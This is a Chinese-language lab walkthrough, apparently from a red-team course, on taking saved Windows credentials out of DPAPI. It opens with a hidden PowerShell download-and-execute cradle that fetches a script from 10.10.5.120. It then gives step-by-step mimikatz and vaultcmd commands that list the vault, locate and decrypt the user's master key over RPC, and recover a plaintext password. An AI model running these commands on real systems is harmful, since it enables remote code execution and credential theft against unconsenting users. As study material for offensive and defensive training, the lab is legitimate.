Data Protection API (DPAPI)是windows里的一个组件，专门用于存储RDP或者第三方软件如谷歌chrome里的数据

powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"


在wkstn-1上操作,以bfarmer的身份操作。这个实验如果以ntlmb身份操作不能复现

查看
```
ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092436532.png)


执行命令,列出本机所有Windows Credentials
```
run vaultcmd /listcreds:"Windows Credentials" /all
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092477880.png)

上面的等价操作,同样显示有dev/bfarmer的Windows Credentials

```
mimikatz vault::list
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092522448.png)


要解密登录凭据，需要找到```guidMasterKey```

根据上面的信息，执行命令

```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092550915.png)


留意这里的masterkey是：```a23a1631-e2ca-4805-9f2f-fe8966fd8698```


主密钥信息存储在用户的```AppData\Roaming\Microsoft\Protect```目录中

执行命令,```S-1-5-21-3263068140-2042698922-2891547269-1120```是用户的SID

```
ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092586556.png)

留意这个文件名：``` a23a1631-e2ca-4805-9f2f-fe8966fd8698```，与我们上面得到的masterkey一致

运行```mimikatz dpapi::masterkey```，指定Master Key信息的路径，并指定操作```/rpc```

```
mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092620590.png)

上面结果留意这个key值，就是解密的秘钥

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092690159.png)


根据秘钥执行解密

```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092737039.png)


上面结果得到明文密码

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660092778146.png)